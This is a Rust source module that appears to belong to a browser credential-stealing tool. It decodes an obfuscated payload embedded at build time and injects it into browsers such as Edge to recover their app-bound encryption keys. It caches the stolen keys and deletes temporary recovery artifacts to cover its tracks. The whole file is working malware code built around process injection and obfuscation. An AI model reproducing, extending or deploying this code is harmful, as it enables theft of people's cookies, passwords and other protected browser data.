use std::{collections::{HashMap, HashSet}, sync::Mutex, time::Duration};
use flate2::read::DeflateDecoder;
use std::io::Read;

const OBFUSCATED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload_obf.bin"));
const KEY_BYTE: u8 = include_bytes!(concat!(env!("OUT_DIR"), "/payload_key.bin"))[0];

#[derive(Clone, Copy, PartialEq, Debug)]
#[allow(dead_code)]
enum Architecture { X64, X86 }

fn browser_architecture(browser_name: &str) -> Architecture {
    match browser_name {
        "Edge" | "Edge Beta" | "Edge Dev" => Architecture::X64,
        _ => Architecture::X64,
    }
}

#[inline(never)]
fn decode_xor_chunk(src: &[u8], key: u8, dst: &mut [u8]) {
    let mut idx = 0usize;
    let len = src.len();
    while idx < len {
        unsafe {
            let b = *src.get_unchecked(idx);
            *dst.get_unchecked_mut(idx) = b ^ key;
        }
        idx = idx.wrapping_add(1);
    }
}

#[inline(never)]
fn get_payload(_arch: Architecture) -> Vec<u8> {
    let obf = OBFUSCATED_PAYLOAD;
    let k = KEY_BYTE;
    let mut buf = vec![0u8; obf.len()];
    decode_xor_chunk(obf, k, &mut buf);
    let mut decoder = DeflateDecoder::new(&buf[..]);
    let mut decompressed = Vec::new();
    decoder.read_to_end(&mut decompressed).expect("decompress payload");
    decompressed
}

static KEY_CACHE: Mutex<Option<HashMap<String, Vec<u8>>>> = Mutex::new(None);
static FAIL_CACHE: Mutex<Option<HashSet<String>>> = Mutex::new(None);

pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
    crate::dbg_log!("ci: fetch_app_bound_key START '{}'", browser_name);
    let arch = browser_architecture(browser_name);
    crate::dbg_log!("ci: browser '{}' using arch {:?}", browser_name, arch);
    let payload = get_payload(arch);
    crate::dbg_log!("ci: payload len={}", payload.len());
    if payload.is_empty() {
        crate::dbg_log!("ci: payload empty, returning None");
        return None;
    }

    if let Ok(guard) = FAIL_CACHE.lock() {
        if guard.as_ref().is_some_and(|s| s.contains(browser_name)) {
            return None;
        }
    }
    if let Ok(guard) = KEY_CACHE.lock() {
        if let Some(map) = guard.as_ref() {
            if let Some(key) = map.get(browser_name) {
                return Some(key.clone());
            }
        }
    }

    let name_owned = browser_name.to_string();
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        crate::dbg_log!("ci: thread: calling inject::recover_key for '{}'", name_owned);
        let result = inject::recover_key(&name_owned, &payload);
        let klen = result.as_ref().map(|k| k.len()).unwrap_or(0);
        crate::dbg_log!("ci: thread: inject::recover_key returned Some?={} len={}", result.is_some(), klen);
        let _ = tx.send(result);
    });

    crate::dbg_log!("ci: waiting for key from channel...");
    let key = match rx.recv_timeout(Duration::from_secs(30)) {
        Ok(Some(k)) => { crate::dbg_log!("ci: key recovered for '{}' ({} bytes)", browser_name, k.len()); k }
        Ok(None) => {
            crate::dbg_log!("ci: channel received None (injection failed)");
            if let Ok(mut guard) = FAIL_CACHE.lock() {
                if guard.is_none() {
                    *guard = Some(HashSet::new());
                }
                if let Some(set) = guard.as_mut() {
                    set.insert(browser_name.to_string());
                }
            }
            return None;
        }
        Err(_) => {
            crate::dbg_log!("ci: channel TIMEOUT (30s expired)");
            if let Ok(mut guard) = FAIL_CACHE.lock() {
                if guard.is_none() {
                    *guard = Some(HashSet::new());
                }
                if let Some(set) = guard.as_mut() {
                    set.insert(browser_name.to_string());
                }
            }
            return None;
        }
    };

    if let Ok(mut guard) = KEY_CACHE.lock() {
        if guard.is_none() {
            *guard = Some(HashMap::new());
        }
        if let Some(map) = guard.as_mut() {
            map.insert(browser_name.to_string(), key.clone());
        }
    }

    Some(key)
}

pub fn cleanup_legacy_artifacts() {
    let legacy = [
        std::env::temp_dir().join("chrome_recovery_result.json"),
        std::env::temp_dir().join("cr_headless_profile"),
    ];
    for path in legacy {
        if path.is_dir() {
            let _ = std::fs::remove_dir_all(path);
        } else {
            let _ = std::fs::remove_file(path);
        }
    }
}
